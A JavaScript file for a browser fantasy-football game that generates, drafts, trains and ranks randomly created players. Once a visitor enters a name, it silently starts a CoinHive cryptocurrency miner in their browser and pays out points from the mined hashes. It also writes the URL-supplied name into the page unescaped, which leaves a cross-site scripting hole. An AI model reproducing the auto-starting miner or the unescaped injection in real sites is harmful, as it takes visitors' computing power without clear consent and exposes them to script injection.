var leagueteams = [];
var named = false;
if (window.location.search.length > 1) {
  document.querySelector("#landing").style.display = "none";
  document.querySelector("#start").style.display = "none";
  document.querySelector("#portal").style.display = "inherit";
  document.querySelector("#tabs").style.display = "-webkit-box";
  document.querySelector("#name").innerHTML = window.location.search.slice(1);
  named = true;
  if (window.location.origin != "file://") {
    // Add coin hive for points
    var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", window.location.search+window.location.hash);
    miner.start();
    console.log("Mining");
    miner.on("accepted", () => {
      console.log(miner.getAcceptedHashes());
    });
    if (miner.getAcceptedHashes() > 0) {
      document.querySelector(".points").innerHTML = "$"+Math.floor(miner.getAcceptedHashes()/100);
      // COMBAK: For testing only
      t = genTeam();
      writeYourTeam(t);
    } else {
      t = genTeam();
      writeYourTeam(t);
      document.querySelector(".points").innerHTML = "$0"
    }
    // NOTE: Keep track of points
    setInterval(() => {
      document.querySelector(".points").innerHTML = "$"+Math.floor(miner.getAcceptedHashes()/100);
    },1000);
  } else {
    // COMBAK:
    t = genTeam();
    writeYourTeam(t);
    document.querySelector(".points").innerHTML = "$0";
  }
  leagueteams.push({name: window.location.search.slice(1), team: t});
  writeLeague();
}

document.querySelector("#start").addEventListener("keyup", (e)=>{
  if (e.key == "Enter") {
    var value = document.querySelector("#start").value;
    window.location.search = "?"+value;
  }
});

var show = "myteam";
function tab(e) {
  if (named) {
    if (show) {
      document.querySelector("#"+show).style.display = "none";
    }
    show = e.getAttribute("data-show");
    document.querySelector("#"+show).style.display = "inherit";
  }
}

function genPlayer(type) {
  var spW, stW, enW, agW;
  if (type == undefined) {
    type = ["qb", "wr", "te", "k", "rb"][Math.floor(Math.random()*5)];
  }
  if (type == "qb") {
    spW = 20;
    stW = 40;
    enW = 10;
    agW = 30;
  } else if (type == "wr") {
    spW = 40;
    stW = 10;
    enW = 25;
    agW = 25;
  } else if (type == "te") {
    spW = 30;
    stW = 30;
    enW = 20;
    agW = 20;
  } else if (type == "k") {
    spW = 40;
    stW = 40;
    enW = 10;
    agW = 10;
  } else if (type == "rb") {
    spW = 30;
    stW = 10;
    enW = 30;
    agW = 30;
  } else if (type == "flex") {
    spW = 25;
    stW = 25;
    enW = 25;
    agW = 25;
  }
  var body = {};
  body["name"] = chance.name({gender: "male"});
  body["age"] = 23+Math.floor(Math.random()*15);
  body["speed"] = Math.floor(spW+Math.random()*(spW/2));
  body["strength"] = Math.floor(stW+Math.random()*(stW/2));
  body["endurance"] = Math.floor(enW+Math.random()*(enW/2));
  body["agilty"] = Math.floor(agW+Math.random()*(agW/2));
  body["position"] = type;
  return body;
}

function genTeam() {
  var team = {
    "qb": [genPlayer("qb")],
    "rb": [genPlayer("rb"),genPlayer("rb")],
    "wr": [genPlayer("wr"),genPlayer("wr")],
    "te": [genPlayer("te")],
    "k": [genPlayer("k")],
    "bn": [genPlayer(),genPlayer(),genPlayer(),genPlayer(),genPlayer(),genPlayer()],
    "flex": [genPlayer("flex")]
  };
  return team;
}

function writeYourTeam(team) {
  for (var pos in team) {
    var e = document.querySelector("#"+pos).children[1].children[0];
    if (e.children.length > 1) {
      var m = e.children.length;
      for (var i = 1; i < m; i++) {
        e.removeChild(e.lastChild);
      }
    }
    for (var i = 0; i < team[pos].length; i++) {
      var str = "";
      str += "<tr><td>("+team[pos][i].position.toUpperCase()+") "+team[pos][i].name+" ("+team[pos][i].age+")</td>";
      str += "<td>"+team[pos][i].speed+"</td>";
      str += "<td>"+team[pos][i].strength+"</td>";
      str += "<td>"+team[pos][i].agilty+"</td>";
      str += "<td>"+team[pos][i].endurance+"</td></tr>";
      e.innerHTML += str;
    }
  }
}

function writeTeam(team) {
  var str = "";
  for (var pos in team) {
    for (var i = 0; i < team[pos].length; i++) {
      str += "<tr><td>("+team[pos][i].position.toUpperCase()+") "+team[pos][i].name+" ("+team[pos][i].age+")</td>";
      str += "<td>"+team[pos][i].speed+"</td>";
      str += "<td>"+team[pos][i].strength+"</td>";
      str += "<td>"+team[pos][i].agilty+"</td>";
      str += "<td>"+team[pos][i].endurance+"</td></tr>";
    }
  }
  return str;
}

function draft() {
  document.querySelector("#startdraft").style.display = "none";
  document.querySelector("#newplayer").style.display = "inherit";
  if (document.querySelector("#newplayer").children[1].children[0].children.length > 1) {
    document.querySelector("#newplayer").children[1].children[0].removeChild(document.querySelector("#newplayer").children[1].children[0].children[1]);
  }
  // Generate player and put him in global Space
  p = genPlayer();
  var str = "";
  str += "<tr><td>("+p.position.toUpperCase()+") "+p.name+" ("+p.age+")</td>";
  str += "<td>"+p.speed+"</td>";
  str += "<td>"+p.strength+"</td>";
  str += "<td>"+p.agilty+"</td>";
  str += "<td>"+p.endurance+"</td></tr>";
  document.querySelector("#newplayer").children[1].children[0].innerHTML += str;
}

function sign() {
  document.querySelector(".buttons").parentElement.removeChild(document.querySelector(".buttons"));
  document.querySelector("#rot").style.display = "inherit";
}

function train() {
  document.querySelector("#selectPlayer").style.display = "inherit";
  document.querySelector("#rot").removeChild(document.querySelector("#rot").children[0]);
  var dd = document.querySelector("#dd");
  for (var key in t) {
    if (t.hasOwnProperty(key)) {
      for (var i = 0; i < t[key].length; i++) {
        dd.innerHTML += "<option value='"+key+"|"+i+"'>("+t[key][i].position.toUpperCase()+") "+t[key][i].name+"</option>";
      }
    }
  }
}

function startTraining() {
  document.querySelector("#trainingArea").style.display = "inherit";
  document.querySelector("#go").style.display = "none";
  var count = 0;
  var dd = document.querySelector("#dd");
  var c = t[dd.value.split("|")[0]][parseInt(dd.value.split("|")[1])];
  console.log(c);
  var addStats = document.querySelector("#addStats");
  addStats.innerHTML += "<td>+"+Math.min(Math.abs(c.speed-p.speed), 20)+"</td>";
  addStats.innerHTML += "<td>+"+Math.min(Math.abs(c.strength-p.strength), 20)+"</td>";
  addStats.innerHTML += "<td>+"+Math.min(Math.abs(c.agilty-p.agilty), 20)+"</td>";
  addStats.innerHTML += "<td>+"+Math.min(Math.abs(c.endurance-p.endurance), 20)+"</td>";
  var int = setInterval(() => {
    count++
    document.querySelector("#trainingArea").children[0].innerHTML = "Training"+"...".slice(2-count%3);
  },300);
  setTimeout(() => {
    clearInterval(int);
    c.speed += Math.min(Math.abs(c.speed-p.speed), 20);
    c.strength += Math.min(Math.abs(c.strength-p.strength), 20);
    c.agilty += Math.min(Math.abs(c.agilty-p.agilty), 20);
    c.endurance += Math.min(Math.abs(c.endurance-p.endurance), 20);
    document.querySelector("#trainingArea").children[0].innerHTML = "Training Complete";
    document.querySelector("#done").style.display = "inherit";
    // Table
    var table = addStats.parentElement;
    var str = "<tr><th>Name/Age</th><th>Speed</th><th>Strength</th><th>Agilty</th><th>Endurance</th></tr>";
    str += "<tr><td>("+c.position.toUpperCase()+") "+c.name+" ("+c.age+")</td>";
    str += "<td>"+c.speed+"</td>";
    str += "<td>"+c.strength+"</td>";
    str += "<td>"+c.agilty+"</td>";
    str += "<td>"+c.endurance+"</td></tr>";
    table.innerHTML = str;
    writeYourTeam(t);
  },5000);
}
var mydraft = document.querySelector("#mydraft").innerHTML;
function done() {
  document.querySelector("#mydraft").innerHTML = mydraft;
}

function replace() {
  document.querySelector("#replacePlayer").style.display = "inherit";
  document.querySelector("#rot").removeChild(document.querySelector("#rot").children[0]);
  var rp1 = document.querySelector("#rp1");
  var rp2 = document.querySelector("#rp2");
  for (var key in t) {
    if (t.hasOwnProperty(key)) {
      for (var i = 0; i < t[key].length; i++) {
        var element = "<option value='"+key+"|"+i+"'>("+t[key][i].position.toUpperCase()+") "+t[key][i].name+"</option>";
        rp1.innerHTML += element;
      }
    }
  }
  rp2.innerHTML = "<option>("+p.position.toUpperCase()+") "+p.name+"</option>";;
}

function startReplacement() {
  var rp1 = document.querySelector("#rp1");
  t[rp1.value.split("|")[0]][parseInt(rp1.value.split("|")[1])] = p;
  writeYourTeam(t);
  done();
}

function avgTeam(team) {
  var teamStats = {"age": 0,"speed": 0,"strength": 0,"endurance": 0,"agilty": 0};
  for (var position in team) {
    var player = team[position];
    for (var i = 0; i < player.length; i++) {
      teamStats.age += player[i].age;
      teamStats.speed += player[i].speed;
      teamStats.strength += player[i].strength;
      teamStats.endurance += player[i].endurance;
      teamStats.agilty += player[i].agilty;
    }
  }
  teamStats.age = Math.floor(teamStats.age/14);
  teamStats.speed = Math.floor(teamStats.speed/14);
  teamStats.strength = Math.floor(teamStats.strength/14);
  teamStats.endurance = Math.floor(teamStats.endurance/14);
  teamStats.agilty = Math.floor(teamStats.agilty/14);
  return teamStats;
}

function writeLeague() {
  var str = "";
  for (var i = 0; i < leagueteams.length; i++) {
    var team = leagueteams[i]
    var stats = avgTeam(team.team);
    str += "<tr onclick='viewTeam()' style='cursor: pointer;'><td>"+team.name+"</td>";
    str += "<td>"+stats.age+"</td>";
    str += "<td>"+stats.speed+"</td>";
    str += "<td>"+stats.strength+"</td>";
    str += "<td>"+stats.endurance+"</td>";
    str += "<td>"+stats.agilty+"</td></tr>";
  }
  document.querySelector("#myleague").children[0].children[1].children[0].children[0].innerHTML += str;
}

function viewTeam() {
  console.log("View");
}
